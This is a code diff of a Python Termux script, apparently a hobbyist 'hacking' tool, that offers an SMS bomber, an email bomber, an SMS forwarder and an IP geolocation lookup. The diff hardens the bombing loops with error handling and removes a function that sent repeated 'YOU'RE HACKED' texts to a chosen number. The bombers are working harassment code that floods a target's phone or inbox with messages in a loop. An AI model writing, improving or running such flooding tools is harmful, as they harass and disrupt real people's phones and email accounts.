@@ -1,9 +1,10 @@
 import os
-import subprocess
 import time
+import subprocess
+import smtplib
 import requests
+from email.mime.text import MIMEText
 from colorama import Fore
-import re
 
 # Colors for UI
 R = Fore.RED
@@ -30,6 +31,10 @@ def banner():
     print(f"{G}Made by AllahAkbar313{W}")
     print("\n")
 
+# SMS Forwarder
+def forward_sms(phone_number, message):
+    print(f"{G}[+] New Message from {phone_number}: {W}{message}")
+
 # Get Phone Number
 def get_phone_number():
     while True:
@@ -47,10 +52,6 @@ def get_sms():
     result = subprocess.run(["termux-sms-list"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     sms_list = result.stdout.decode("utf-8").strip().split("\n")
     return sms_list
-
-# Forward SMS
-def forward_sms(phone_number, message):
-    print(f"{G}[+] New Message from {phone_number}: {W}{message}")
 
 # Start Tracking
 def start_tracking(phone_number, update_interval):
@@ -70,20 +71,20 @@ def start_tracking(phone_number, update_interval):
     except KeyboardInterrupt:
         print(f"{R}\nTracking stopped. Exiting...{W}")
 
-# Function to perform SMS Bombing
+# SMS Bomber Function
 def sms_bomber(phone_number, delay, bomb_count):
     print(f"{Y}Starting SMS Bombing on {phone_number}...{W}")
     for i in range(bomb_count):
-        subprocess.run(["termux-sms-send", "-n", phone_number, f"Bombing message {i+1}!"])
-        print(f"{G}[{i+1}] SMS Sent!{W}")
+        result = subprocess.run(["termux-sms-send", phone_number, f"Bombing message {i+1}!"], capture_output=True, text=True)
+        if result.returncode != 0:
+            print(f"{R}Error: {result.stderr}{W}")
+        else:
+            print(f"{G}[{i+1}] SMS Sent!{W}")
         time.sleep(delay)  # Delay between sending each SMS
     print(f"{G}Bombing completed!{W}")
 
 # Email Bomber Function
 def email_bomber(target_email, subject, body, count):
-    import smtplib
-    from email.mime.text import MIMEText
-
     print(f"{Y}Starting Email Bombing on {target_email}...{W}")
     for i in range(count):
         msg = MIMEText(body)
@@ -91,11 +92,14 @@ def email_bomber(target_email, subject, body, count):
         msg['From'] = "your-email@gmail.com"
         msg['To'] = target_email
 
-        with smtplib.SMTP("smtp.gmail.com", 587) as server:
-            server.starttls()
-            server.login("your-email@gmail.com", "your-email-password")
-            server.sendmail("your-email@gmail.com", target_email, msg.as_string())
-            print(f"{G}[{i+1}] Email Sent!{W}")
+        try:
+            with smtplib.SMTP("smtp.gmail.com", 587) as server:
+                server.starttls()
+                server.login("your-email@gmail.com", "your-email-password")
+                server.sendmail("your-email@gmail.com", target_email, msg.as_string())
+                print(f"{G}[{i+1}] Email Sent!{W}")
+        except Exception as e:
+            print(f"{R}Error: {str(e)}{W}")
         time.sleep(1)
 
 # IP Tracker Function (Dummy for now, real IP tracker requires external API)
@@ -107,46 +111,10 @@ def ip_tracker(ip_address):
     print(f"Location: {data['city']}, {data['region']}, {data['country']}")
     print(f"Coordinates: {data['loc']}")
 
-# Function to validate phone number
-def validate_phone_number(phone_number):
-    # Regular expression to match international phone numbers (e.g., +96877384814 for Oman)
-    pattern = r'^\+?[0-9]+$'  # Matches numbers that may start with "+" followed by digits only
-    if re.match(pattern, phone_number):
-        return phone_number
-    else:
-        raise ValueError("Invalid phone number. Please make sure it's in the correct format, e.g., +96877384814")
-
-# Function to send SMS
-def send_sms(phone_number, message, delay, count):
-    # Validate the phone number before proceeding
-    phone_number = validate_phone_number(phone_number)
-
-    for i in range(count):
-        try:
-            # Attempt to send SMS using Termux API
-            result = subprocess.run(['termux-sms-send', phone_number, message], capture_output=True, text=True)
-
-            # Check the result if there's an error, and handle accordingly
-            if "Termux:API" in result.stderr:
-                print(f"[{i+1}] Error detected with Termux API. Sending custom message instead.")
-
-                # Force sending your custom message
-                custom_message = "YOU'RE HACKED"
-                os.system(f"termux-sms-send {phone_number} '{custom_message}'")
-                print(f"[{i+1}] Sent custom message: '{custom_message}' to {phone_number}")
-            else:
-                # If no error, it means the message was sent properly using Termux API
-                print(f"[{i+1}] Sent message: '{message}' to {phone_number}")
-
-            time.sleep(delay)  # Delay between each message
-
-        except Exception as e:
-            print(f"Error: {e}")
-
 # Main Function to Run the Bot
 def main():
     banner()
-    choice = input(f"{C}Select Option:\n1. SMS Forwarder\n2. SMS Bomber\n3. Email Bomber\n4. IP Tracker\n5. SMS Sender\n{W}Choice: ")
+    choice = input(f"{C}Select Option:\n1. SMS Forwarder\n2. SMS Bomber\n3. Email Bomber\n4. IP Tracker\n{W}Choice: ")
 
     if choice == "1":
         phone_number = get_phone_number()
@@ -169,15 +137,6 @@ def main():
     elif choice == "4":
         ip_address = input(f"{C}Enter IP address to track: {W}")
         ip_tracker(ip_address)
-
-    elif choice == "5":
-        phone_number = input("Enter phone number to send SMS: ")
-        message = input("Enter custom message (leave empty for default): ")
-        if not message:
-            message = "YOU'RE HACKED"  # Default message if user does not input one
-        delay = int(input("Enter delay (in seconds) between messages: "))
-        count = int(input("Enter the number of SMS to send: "))
-        send_sms(phone_number, message, delay, count)
 
     else:
         print(f"{R}Invalid Option!{W}")
